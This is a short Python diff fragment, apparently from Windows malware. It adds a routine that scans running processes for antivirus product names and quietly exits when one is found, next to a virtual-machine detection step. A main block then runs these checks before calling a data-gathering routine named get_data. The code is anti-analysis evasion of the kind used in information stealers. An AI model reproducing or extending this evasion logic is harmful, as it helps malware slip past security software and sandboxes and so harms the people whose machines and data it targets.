+            logs_handler(f"[ERROR] - virtual machine manufacturer detected: {str(Error)}")
+
+    async def check_antivirus_processes(self) -> None:
+        try:
+            antivirus_names = [
+                "avast", "avg", "avira", "bitdefender", "kaspersky", "mcafee", 
+                "norton", "sophos", "trend micro", "windows defender", "eset", 
+                "malwarebytes", "comodo", "f-secure", "360 total security"
+            ]
+            for proc in psutil.process_iter(attrs=['name']):
+                if any(av_name in proc.info['name'].lower() for av_name in antivirus_names):
+                    ctypes.windll.kernel32.ExitProcess(0)
+        except Exception as Error:
+            logs_handler(f"[ERROR] - antivirus software detected: {str(Error)}")
         
 if __name__ == '__main__':
     if os.name == "nt":
-        anti = anti_vm()
-        asyncio.run(anti.run_all_fonctions())
+        anti = AntiVM()
+        asyncio.run(anti.run_all_functions())
 
         main = get_data()
         asyncio.run(main.RunAllFonctions())
